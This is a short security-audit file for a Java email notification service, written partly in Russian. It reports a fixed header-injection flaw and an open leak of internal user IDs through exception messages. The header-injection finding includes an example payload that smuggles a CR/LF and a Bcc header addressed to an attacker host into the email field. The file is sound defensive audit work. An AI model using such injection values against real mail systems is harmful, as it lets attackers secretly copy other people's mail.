# Security Issues — pheme-notify

## 1. Email Header Injection

**File:** `src/main/java/com/pheme/phemenotify/provider/EmailProvider.java`  
**Line:** ~26 (`event.payload().get("email")`)  
**Severity:** High  

**Описание:**  
`email` берётся из payload события и передаётся напрямую в `helper.setTo(email)` без валидации.
Если `email` содержит символы `\r\n`, атакующий может внедрить произвольные MIME-заголовки в письмо (header injection).

**Пример атаки:**
```
email = "victim@example.com\r\nBcc: attacker@evil.com"
```

**Статус:** Исправлено — добавлена валидация формата + проверка на CR/LF перед `setTo()`.

---

## 2. Утечка внутренней информации в сообщении исключения

**File:** `src/main/java/com/pheme/phemenotify/provider/EmailProvider.java`  
**Line:** ~28 (`throw new IllegalArgumentException(... + event.userId())`)  
**Severity:** Low  

**Описание:**  
`userId` из внутреннего события включается в сообщение исключения.
Если исключение попадает в HTTP-ответ (через `GlobalExceptionHandler`), клиент видит внутренний идентификатор пользователя.

**Статус:** Открыто — проверить что `GlobalExceptionHandler` не пробрасывает message из `IllegalArgumentException` в ответ клиенту.
